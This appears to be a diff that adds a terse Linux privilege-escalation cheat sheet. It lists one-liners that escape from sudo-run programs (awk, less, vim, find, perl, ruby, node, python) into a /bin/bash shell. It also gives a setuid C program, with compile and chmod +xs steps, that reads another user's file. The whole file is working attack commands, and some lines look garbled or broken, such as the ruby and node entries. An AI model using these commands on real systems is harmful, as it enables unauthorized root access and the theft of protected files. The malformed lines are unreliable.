@@ -1,0 +1,25 @@
+(sudo)
+awk 'BEGIN {system("/bin/bash")}'
+less !/bin/bash
+vim :!/bin/bash
+find . -exec /bin/bash \;
+perl -e 'print `/bin/bash`'
+ruby -e 'require "irb" ; IRB.start(__FILE__)' => `/bin/bash`
+node -e 'var exec = require("child_process").exec;exec("/home/user/xxx.txt", function (error, stdOut, stdErr) {console.log(stdOut);});'
+python
+------
+from subprocess import call
+call(['/bin/bash'])
+or
+import os
+os.system('/bin/bash')
+
+
+set s bit (sudo chmod + cp or mv)
+--------------------------------
+int main(void)
+{
+system("cat /home/userSbit/xxx.txt");
+}
+gcc -o /tmp/[FILE] [FILE].c
+chmod +xs [FILE]
